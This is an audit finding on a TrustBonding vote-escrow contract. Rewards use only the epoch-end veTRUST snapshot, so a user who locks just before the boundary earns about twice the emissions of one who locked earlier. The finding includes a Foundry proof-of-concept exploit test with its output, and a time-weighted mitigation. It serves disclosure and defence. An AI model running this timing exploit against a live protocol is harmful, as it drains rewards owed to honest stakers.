# Epoch Snapshot Reward Calculation Allows Shorter Locks to Earn Disproportionately Higher Emissions 


## Finding Description

The TrustBonding contract allocates protocol emissions based solely on a user's veTRUST balance at the epoch-end snapshot — completely ignoring how long tokens were locked during the epoch.

The protocol follows a vote-escrow model where users lock TRUST tokens and receive time-decaying voting power (veTRUST), intending to reward earlier and longer locks with proportionally greater emissions. But because reward allocation uses only the epoch-boundary balance rather than integrating ve balance over time, users who lock earlier suffer continuous linear decay before the snapshot while late lockers experience almost none.

By delaying lock creation until shortly before the epoch boundary, a attacker can maintain a higher effective ve balance at snapshot time — allowing strategically timed locks to outperform longer ones and breaking the intended time-weighted incentive structure.


## Vulnerable Code

Reward distribution relies on the user’s bonded balance at the epoch-end snapshot:

```solidity
function _userEligibleRewardsForEpoch(address account, uint256 epoch) internal view returns (uint256) {
    uint256 userBalance = userBondedBalanceAtEpochEnd(account, epoch);
    uint256 totalBalance = totalBondedBalanceAtEpochEnd(epoch);

    if (userBalance == 0 || totalBalance == 0) {
        return 0;
    }

    return (userBalance * _emissionsForEpoch(epoch)) / totalBalance;
}
```

The bonded balance used for this calculation is obtained at the epoch snapshot:

```solidity
return _balanceOf(account, _epochTimestampEnd(epoch));
```

Because this value represents the user’s ve balance only at a single timestamp, the reward calculation ignores how long tokens were locked during the epoch. Users who lock earlier experience greater ve decay before the snapshot, while users who lock later maintain a higher effective balance when rewards are calculated.

This creates a manipulable condition where Lock timing is therefore a more effective lever for maximizing rewards than lock duration.


## Impact

The reward mechanism allows users who lock for a shorter duration to receive greater emissions than users who remain locked longer by strategically timing their lock creation near the epoch snapshot.

The Proof of Concept demonstrates this behavior using two users locking the same amount of tokens within the same epoch:

**Honest Lock Duration**

* Weeks: 2
* Days: 6
* Hours: 23

**Attacker Lock Duration**

* Weeks: 2
* Days: 0
* Hours: 0

Despite remaining locked for nearly one week less, the attacker receives:

* Honest Rewards:   21.27
* Attacker Rewards: 42.55

This results in the attacker receiving approximately 2× the emissions while committing capital for a shorter lock period.

Because emissions are distributed proportionally among participants each epoch, attackers capturing disproportionate rewards directly reduce the emissions available to honest participants. Lock timing can be manipulated every epoch, this strategy can be repeated, allowing attackers to continuously extract excess emissions while committing less time-weighted capital than the protocol intends to reward.



## Recommended Mitigation Steps

Modify the reward calculation to account for time-weighted veTRUST exposure during the entire epoch, rather than relying solely on the epoch-end snapshot balance.

This can be achieved by tracking each user’s ve balance integral over the epoch (e.g., average veTRUST or cumulative veTRUST-time) and distributing emissions proportionally to this value. By basing rewards on veTRUST × time, users who lock earlier or for longer durations will correctly receive higher rewards, eliminating the incentive to delay locks until just before the epoch boundary.


## Proof of Concept

The PoC compares two users locking the same amount of tokens during epoch 3, but with different lock timings.

* Honest user locks at the start of epoch 3 and remains locked for the entire epoch.
* Attacker waits until just before the epoch 3 snapshot and then creates the lock.
* Both users claim rewards when epoch 4 begins.

Because rewards are calculated using the ve balance at the epoch-end snapshot, the attacker experiences far less ve decay and appears with a higher effective balance despite locking for a shorter duration, resulting in significantly higher emissions than the honest user.

Both locks expire before the epoch 4 snapshot, so neither user receives rewards for epoch 4. Therefore the comparison focuses on the manipulated epoch 3 reward distribution.


### Code

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import {BaseTest} from "./BaseTest.t.sol";
import {console2} from "forge-std/src/console2.sol";

contract PoCCore is BaseTest {

    function test_submissionValidity() external {

        address honestUser = users.alice;
        address attacker   = users.bob;
        address commonUser = users.charlie;

        bytes32 atomId = createSimpleAtom("attack-atom", getAtomCreationCost(), users.admin);
        uint256 curveId = getDefaultCurveId();

        vm.deal(
            protocol.trustBonding.satelliteEmissionsController(),
            EMISSIONS_CONTROLLER_EMISSIONS_PER_EPOCH * 100 ether
        );

        vm.warp(3 * TRUST_BONDING_EPOCH_LENGTH + 1000);

        resetPrank(commonUser);
        protocol.trustBonding.create_lock(5e18, block.timestamp + 30 * THREE_WEEKS);

        vm.startPrank(honestUser);

        uint256 honestLockStart = block.timestamp;

        protocol.trustBonding.create_lock(10e18, block.timestamp + THREE_WEEKS);
        makeDeposit(honestUser, honestUser, atomId, curveId, 10 ether, 0);

        uint256 honestLockEnd = protocol.trustBonding.locked__end(honestUser);
        uint256 honestDuration = honestLockEnd - honestLockStart;

        vm.stopPrank();

        _printDuration("Honest User Lock Duration", honestDuration);

        vm.warp(4 * TRUST_BONDING_EPOCH_LENGTH - 1000);

        vm.startPrank(attacker);

        uint256 attackerLockStart = block.timestamp;

        protocol.trustBonding.create_lock(10e18, block.timestamp + TWO_WEEKS + ONE_DAY);
        makeDeposit(attacker, attacker, atomId, curveId, 10 ether, 0);

        uint256 attackerLockEnd = protocol.trustBonding.locked__end(attacker);
        uint256 attackerDuration = attackerLockEnd - attackerLockStart;

        vm.stopPrank();

        _printDuration("Attacker Lock Duration", attackerDuration);

        vm.warp(4 * TRUST_BONDING_EPOCH_LENGTH + ONE_DAY);

        vm.startPrank(honestUser);

        uint256 honestBefore = honestUser.balance;
        protocol.trustBonding.claimRewards(honestUser);
        uint256 honestRewards = honestUser.balance - honestBefore;

        vm.stopPrank();

        vm.startPrank(attacker);

        uint256 attackerBefore = attacker.balance;
        protocol.trustBonding.claimRewards(attacker);
        uint256 attackerRewards = attacker.balance - attackerBefore;

        vm.stopPrank();

        console2.log("===========================================");
        console2.log("Honest Rewards:", honestRewards);
        console2.log("Attacker Rewards:", attackerRewards);

        if (attackerRewards > honestRewards) {
            console2.log("Attacker advantage:", attackerRewards - honestRewards);
        }

        console2.log("===========================================");
    }

    function _printDuration(string memory label, uint256 duration) internal {

        uint256 weeksPart = duration / 1 weeks;
        uint256 daysPart = (duration % 1 weeks) / 1 days;
        uint256 hoursPart = (duration % 1 days) / 1 hours;

        console2.log(label);
        console2.log("Weeks:", weeksPart);
        console2.log("Days:", daysPart);
        console2.log("Hours:", hoursPart);
    }
}
```


### Output

```
Honest Lock Duration
Weeks: 2
Days: 6
Hours: 23

Attacker Lock Duration
Weeks: 2
Days: 0
Hours: 0

===========================================
Honest Rewards: 21276562436374468469
Attacker Rewards: 42553160052308487095
Attacker advantage: 21276597615934018626
===========================================
```
